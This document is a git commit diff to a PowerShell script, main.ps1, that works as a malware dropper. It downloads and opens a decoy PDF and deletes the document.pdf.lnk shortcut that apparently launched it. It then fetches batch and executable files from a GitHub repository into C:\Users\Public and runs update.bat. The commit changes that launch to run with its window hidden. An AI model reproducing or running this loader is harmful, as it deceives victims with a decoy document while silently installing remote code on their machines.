d5dd235e805189932eaca8a5ba7da49ee01b5426
sys!!+root <79191180+Algorithm99root@users.noreply.github.com>
2025-03-10 00:28:37 +0000

    Update main.ps1

--- main.ps1
+++ main.ps1
@@ -1,4 +1,4 @@
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Algorithm99root/oiii__hoyyyy/refs/heads/main/update.exe" -OutFile "C:\\Users\\Public\\update.exe"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Algorithm99root/oiii__hoyyyy/refs/heads/main/error.bat" -OutFile "C:\\Users\\Public\\error.bat"
 Invoke-WebRequest -Uri "https://basis.org.bd/public//files/gazette/fd7cb610579e8e481f70e2934cb011d6-24092024095808.pdf" -OutFile "$PWD\document.pdf"
 Start-Process "$PWD\document.pdf"
 
@@ -6,4 +6,4 @@ if (Test-Path "$PWD\document.pdf.lnk") {
     Remove-Item "$PWD\document.pdf.lnk" -Force
 }
 Start-Sleep -Seconds 3
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Algorithm99root/oiii__hoyyyy/refs/heads/main/update.bat" -OutFile "C:\\Users\\Public\\update.bat"; Start-Process "C:\\Users\\Public\\update.bat"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Algorithm99root/oiii__hoyyyy/refs/heads/main/update.bat" -OutFile "C:\\Users\\Public\\update.bat";  Start-Process -WindowStyle Hidden -FilePath "C:\\Users\\Public\\update.bat"
